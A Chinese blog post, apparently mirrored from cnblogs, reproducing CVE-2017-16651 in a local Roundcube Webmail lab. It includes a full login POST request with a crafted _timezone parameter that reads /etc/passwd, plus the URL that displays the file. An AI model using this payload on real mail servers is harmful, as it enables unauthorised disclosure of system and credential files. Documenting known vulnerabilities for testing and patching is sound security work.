# Roundcube Webmail File Disclosure Vulnerability(CVE-2017-16651) - starnight_cyber - 博客园

> 原文：[`www.cnblogs.com/Hi-blog/p/8760413.html`](https://www.cnblogs.com/Hi-blog/p/8760413.html)

#### Preface

*   Software: [`roundcube.net/`](https://roundcube.net/)
*   Versions: 1.1.0 - 1.1.9, 1.2.0 - 1.2.6, 1.3.0 - 1.3.2
*   CVE: CVE-2017-16651
*   Author: Thomas Bruederli
*   Release date: 2017-11-09
*   Link: [Roundcube Webmail File Disclosure Vulnerability](https://gist.github.com/thomascube/3ace32074e23fca0e6510e500bd914a1)

#### 环境搭建

请参考：[CentOS6 安装 Sendmail + Dovecot + Roundcubemail](http://www.cnblogs.com/Hi-blog/p/7360298.html)

#### 漏洞测试

本地环境：CentOS 6 + Roundcube Webmail 1.1.4

url : http://mail.roundcube.com/roundcubemail/

account : user1/123456

![](img/0f2114da3314dfb52f727718031fc526.png)

登录、抓包，修改 _timezone 为如下（以读取/etc/passwd 文件为例）：

![](img/b0c22ab57f76bc626b1965b97858eeaa.png)

![](img/8f900a89c6347c561fdf2122f13be562.png)![](img/961ddebeb323a10fe0623af514929fc1.png)

```
POST /roundcubemail/?_task=login HTTP/1.1 Host: mail.roundcube.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:59.0) Gecko/20100101 Firefox/59.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://mail.roundcube.com/roundcubemail/ Content-Type: application/x-www-form-urlencoded
Content-Length: 122
Cookie: roundcube_sessid=33mpv2cn5mjdjhjcpfgkaf0oh2; language=en
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

_token=b8bdd3abae1d62621594f0de93a12a55&_task=login&_action=login&_timezone[files][1][path]=/etc/passwd&_url=&_user=user1&_pass=123456
```

View Code

访问：http://mail.roundcube.com/roundcubemail/**?_task=settings&_action=upload-display&_from=timezone&_file=rcmfile1**

便可读取/etc/passwd 文件中的内容

![](img/974e95469acac1be1a4f4fc63258de22.png)

就这样...